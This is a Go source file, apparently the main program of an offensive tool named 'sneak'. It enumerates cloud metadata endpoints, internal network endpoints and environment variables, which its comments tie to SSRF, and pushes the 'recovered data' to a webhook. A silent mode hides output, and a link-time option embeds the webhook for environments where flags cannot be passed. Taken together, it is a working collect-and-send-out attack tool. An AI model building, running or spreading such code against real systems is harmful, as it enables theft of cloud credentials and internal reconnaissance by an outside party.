package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/ex0dus-0x/sneak"
)

var (
	// Disables specific SSRF checks
	noCloud = flag.Bool("no-cloud", false, "Disables enumerating for cloud metadata endpoints")
	noNet   = flag.Bool("no-net", false, "Disables enumerating environment for internal network endpoints")
	noEnv   = flag.Bool("no-env", false, "Disables enumerating envvars for internal endpoints")

	cloudMeta = flag.String("cloud", "", "Sets a specific cloud provider to do SSRF checks for")
	webhook   = flag.String("webhook", "", "Webhook endpoint to push recovered data to")
	silent    = flag.Bool("silent", false, "Do not output results to stdout")
	help      = flag.Bool("help", false, "Display this help screen")
)


// We can also set this through the linker in the case we're in an environment
// where passing in flags or envvars isn't possible
var CompileTimeWebhook string

// TODO: better logging
func main() {
	flag.Parse()
	if *help {
		flag.Usage()
		os.Exit(0)
	}

	enum := sneak.StartEnum()
	if !*noCloud {
		fmt.Println("Enumerating cloud")
		if err := enum.CheckCloud(cloudMeta); err != nil {
			fmt.Println(err)
		}
	}
	if !*noNet {
		fmt.Println("Enumerating net")
		enum.CheckNet()
	}
	if !*noEnv {
		fmt.Println("Enumerating envs")
		enum.CheckEnv()
	}

    // override's the flag if set
    if CompileTimeWebhook != "" {
        webhook = &CompileTimeWebhook
        fmt.Printf("Using webhook %s\n", *webhook)
    }

	if err := enum.Export(webhook, *silent); err != nil {
		panic(err)
	}
}
